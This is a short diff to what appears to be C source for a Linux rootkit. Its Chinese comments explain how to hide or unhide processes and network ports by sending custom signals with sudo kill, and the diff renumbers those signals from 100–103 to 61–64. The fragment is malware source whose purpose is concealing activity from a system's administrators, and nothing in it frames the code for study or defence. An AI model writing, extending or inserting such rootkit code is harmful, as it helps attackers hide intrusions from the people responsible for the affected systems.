@@ -19,15 +19,16 @@
 #define PID_LEN 16
 
 /* 
-隐藏进程：sudo kill -101 <PID>
-取消隐藏进程：sudo kill -100 <PID>
-隐藏端口：sudo kill -102 <PORT>
-取消隐藏端口：sudo kill -103 <PORT>
+隐藏进程：sudo kill -61 <PID>
+取消隐藏进程：sudo kill -62 <PID>
+隐藏端口：sudo kill -63 <PORT>
+取消隐藏端口：sudo kill -64 <PORT>
  */
-#define SIG_UNHIDE_PID 100
-#define SIG_HIDE_PID 101
-#define SIG_HIDE_PORT 102
-#define SIG_UNHIDE_PORT 103
+
+#define SIG_HIDE_PID 61
+#define SIG_UNHIDE_PID 62
+#define SIG_HIDE_PORT 63
+#define SIG_UNHIDE_PORT 64
 
 static char hide_pids[MAX_HIDDEN_PIDS][PID_LEN];
 static int hide_pids_count = 0;
